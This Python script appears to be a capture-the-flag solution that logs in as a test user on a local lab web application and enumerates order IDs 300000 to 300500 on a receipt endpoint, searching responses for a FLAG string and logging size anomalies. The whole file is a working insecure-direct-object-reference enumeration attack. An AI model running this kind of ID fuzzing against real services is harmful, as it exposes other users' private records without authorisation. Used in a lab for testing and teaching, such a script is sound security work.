import requests
import re

# Target base URL
BASE_URL = "http://127.0.0.1:32780"

def authenticate():
    """Authenticate and return session with valid cookie"""
    session = requests.Session()
    
    # Step 1: Username
    session.post(f"{BASE_URL}/", data={"username": "test"})
    
    # Step 2: Password
    auth_response = session.post(
        f"{BASE_URL}/password/test",
        data={"username": "test", "user_id": "10032", "password": "test"},
        allow_redirects=False
    )
    
    # Extract session cookie
    set_cookie_header = auth_response.headers.get('Set-Cookie', '')
    if 'session=' in set_cookie_header:
        session_value = set_cookie_header.split('session=')[1].split(';')[0]
        session.cookies.set('session', session_value, domain='127.0.0.1', path='/')
    
    return session

# Authenticate
session = authenticate()
print("[+] Authentication successful\n")

# Fuzz orders 300000-300500, looking for FLAG
print("[*] Fuzzing order_id range 300000-300500 for FLAG pattern...\n")

anomalies = []
flag_found = False

for order_id in range(300000, 300501):
    response = session.get(f"{BASE_URL}/order/{order_id}/receipt", allow_redirects=False)
    
    # Search for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    
    if flag_match:
        flag_value = flag_match.group(0)
        print(f"\n{'='*80}")
        print(f"[!!!] FLAG FOUND at order_id={order_id}")
        print(f"[!!!] FLAG: {flag_value}")
        print(f"{'='*80}\n")
        print(f"Full response from order {order_id}:")
        print(response.text)
        flag_found = True
        break
    
    # Track response size anomalies
    content_len = len(response.text)
    if content_len != 755:  # Most orders are 755B
        anomalies.append((order_id, content_len, response.status_code))
    
    # Progress updates
    if (order_id - 300000 + 1) % 100 == 0:
        print(f"[*] Progress: {order_id - 300000 + 1}/501 tested | Anomalies: {len(anomalies)}")

if not flag_found:
    print(f"\n[*] Fuzzing complete. No FLAG found in range.")
    print(f"[*] Anomalies detected: {len(anomalies)}")
    if anomalies:
        print(f"\nAnomalous order_ids (different content length):")
        for order_id, size, status in anomalies[:20]:  # Show first 20
            print(f"  Order {order_id}: {size}B (Status: {status})")

